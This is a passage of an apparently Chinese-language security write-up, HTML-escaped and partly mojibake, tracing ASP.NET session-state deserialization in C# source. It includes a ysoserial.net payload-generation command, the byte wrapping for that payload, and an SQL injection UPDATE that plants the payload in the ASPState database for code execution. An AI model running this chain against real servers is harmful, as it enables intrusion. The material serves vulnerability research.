            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Byte&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;BinaryReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;BinaryReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateItemCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionStateItemCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetSessionStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invalid_session_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EndOfStreamException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invalid_session_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionStateStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DeserializeStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Stream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compressionEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥çœ‹åˆ°å¯¦éš›ä¸Š DeserializeStoreData åˆæ˜¯æŠŠååºåˆ—åŒ–éç¨‹è½‰äº¤çµ¦å…¶ä»–é¡åˆ¥ï¼Œè€Œä¾æ“šå–å‡ºçš„è³‡æ–™ä¸åŒï¼Œå¯èƒ½æœƒè½‰äº¤çµ¦ &lt;code class=&quot;highlighter-rouge&quot;&gt;SessionStateItemCollection.Deserialize&lt;/code&gt; æˆ– &lt;code class=&quot;highlighter-rouge&quot;&gt;HttpStaticObjectsCollection.Deserialize&lt;/code&gt; åšè™•ç†ï¼Œåœ¨è§€å¯Ÿç¨‹å¼ç¢¼å¾Œç™¼ç¾ &lt;code class=&quot;highlighter-rouge&quot;&gt;HttpStaticObjectsCollection&lt;/code&gt; çš„è™•ç†ç›¸å°å–®ç´”ï¼Œæ‰€ä»¥æˆ‘å€‹äººå°±é¸æ“‡å¾€é€™å€‹åˆ†æ”¯ä¸‹å»ç ”ç©¶ã€‚&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sealed&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ICollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BinaryReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;typename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsEntry&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AltSerialization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadValueFromStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpStaticObjectsEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// skipped&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è·Ÿé€²å»ä¸€çœ‹ï¼Œç™¼ç¾ HttpStaticObjectsCollection å–å‡ºä¸€äº› bytes ä¹‹å¾Œï¼ŒåˆæŠŠéç¨‹è½‰äº¤çµ¦ &lt;code class=&quot;highlighter-rouge&quot;&gt;AltSerialization.ReadValueFromStream&lt;/code&gt; é€²è¡Œè™•ç†ï¼Œçœ‹åˆ°é€™çš„æœ‹å‹å€‘æˆ–è¨±æœƒè‡‰ä¸Šä¸‰æ¢ç·šåœ°å¿ƒæƒ³ï¼šã€Œè©²ä¸æœƒåˆè¦è¿½é€²å»å§ . . ã€ï¼Œä¸éå…¶å¯¦åˆ°æ­¤ç‚ºæ­¢å°±å·²è¶³å¤ ï¼Œå› ç‚º AltSerialization å¯¦éš›ä¸Šé¡ä¼¼æ–¼ BinaryFormatter çš„åŒ…è£ï¼Œåˆ°æ­¤å·²ç¶“æœ‰è¶³å¤ è³‡è¨Šä½œåˆ©ç”¨ï¼Œå¦å¤–é‚„æœ‰ä¸€å€‹åŸå› å…¼å¥½æ¶ˆæ¯ï¼Œç•¶åˆæˆ‘ç¨‹å¼ç¢¼è¿½åˆ°æ­¤è™•æ™‚ï¼Œä¸Šç¶²ä¸€æŸ¥é€™å€‹ç‰©ä»¶ï¼Œç™¼ç¾ &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; å·²ç¶“æœ‰å»ºç«‹ AltSerialization ååºåˆ—åŒ– payload çš„ pluginï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æå‡ºé€™å€‹åˆ©å™¨ä¾†ä½¿ç”¨ï¼ä¸‹é¢ä¸€è¡ŒæŒ‡ä»¤å°±å¯ä»¥ç”¢ç”ŸåŸ·è¡Œç³»çµ±æŒ‡ä»¤ calc.exe çš„ base64 ç·¨ç¢¼å¾Œçš„ payloadã€‚&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Altserialization &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; HttpStaticObjectsCollection &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;calc.exe&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸éåˆ°æ­¤é‚„æ˜¯æœ‰å€‹å°å•é¡Œéœ€è¦è§£æ±ºï¼Œysoserial.net çš„ AltSerialization plugin æ‰€å»ºç«‹çš„ payload æ˜¯æ”»æ“Š SessionStateItemCollection æˆ– HttpStaticObjectsCollection å…©å€‹é¡åˆ¥çš„ååºåˆ—åŒ–æ“ä½œï¼Œè€Œæˆ‘å€‘å„²å­˜åœ¨è³‡æ–™åº«ä¸­çš„ session åºåˆ—åŒ–è³‡æ–™æ˜¯ç”±åœ¨æ­¤ä¹‹ä¸Šé‚„é¡å¤–ä½œäº†ä¸€å±¤åŒ…è£çš„ SessionStateUtility é¡åˆ¥è™•ç†çš„ï¼Œæ‰€ä»¥å¿…é ˆè¦å†åšé»ä¿®é£¾ã€‚å›é ­å†å»çœ‹çœ‹ç¨‹å¼ç¢¼ï¼Œæœƒç™¼ç¾ SessionStateUtility ä¹Ÿåªæ·»åŠ äº†å¹¾å€‹ bytesï¼Œæ¸›åŒ–å¾Œå¦‚ä¸‹æ‰€ç¤ºï¼š&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å°æ–¼ Int32 è¦æ·»åŠ  4 å€‹ bytesï¼ŒBoolean å‰‡æ˜¯ 1 å€‹ byteï¼Œè€Œå› ç‚ºè¦è®“ç¨‹å¼è·¯å¾‘èƒ½é€²å…¥ HttpStaticObjectsCollection çš„åˆ†æ”¯ï¼Œå¿…é ˆè®“ç¬¬ 6 å€‹ byte ç‚º 1 æ‰èƒ½è®“æ¢ä»¶é”æˆï¼Œå…ˆå°‡åŸæœ¬å¾ ysoserial.net ç”¢å‡ºçš„ payload å¾ base64 è½‰æˆ hex è¡¨ç¤ºï¼Œå†å‰å¾Œå„åˆ¥æ·»åŠ  6ã€1 bytesï¼Œå¦‚ä¸‹ç¤ºæ„åœ–ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  timeout    false  true            HttpStaticObjectsCollection             eof
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”     â”Œâ”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”
00 00 00 00  00     01    010000000001140001000000fff ... ç•¥ ... 0000000a0b ff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¿®é£¾å®Œçš„é€™å€‹ payload å°±èƒ½ç”¨ä¾†æ”»æ“Š SessionStateUtility é¡åˆ¥äº†ï¼&lt;/p&gt;

&lt;p&gt;æœ€å¾Œçš„æ­¥é©Ÿå°±æ˜¯åˆ©ç”¨é–‹é ­çš„ SQL Injection å°‡æƒ¡æ„çš„åºåˆ—åŒ–å…§å®¹æ³¨å…¥é€²å»è³‡æ–™åº«ï¼Œå¦‚æœæ­£å¸¸ç€è¦½ç›®æ¨™ç¶²ç«™æ™‚æœ‰å‡ºç¾ ASP.NET_SessionId çš„ Cookie å°±ä»£è¡¨å·²ç¶“æœ‰ä¸€ç­†å°æ‡‰çš„ Session è¨˜éŒ„å„²å­˜åœ¨è³‡æ–™åº«è£¡ï¼Œæ‰€ä»¥æˆ‘å€‘åªéœ€è¦åŸ·è¡Œå¦‚ä¸‹çš„ SQL Update èªå¥ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?id=1; UPDATE ASPState.dbo.ASPStateTempSessions
       SET SessionItemShort = 0x{Hex_Encoded_Payload}
       WHERE SessionId LIKE &#39;{ASP.NET_SessionId}%25&#39;; --
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

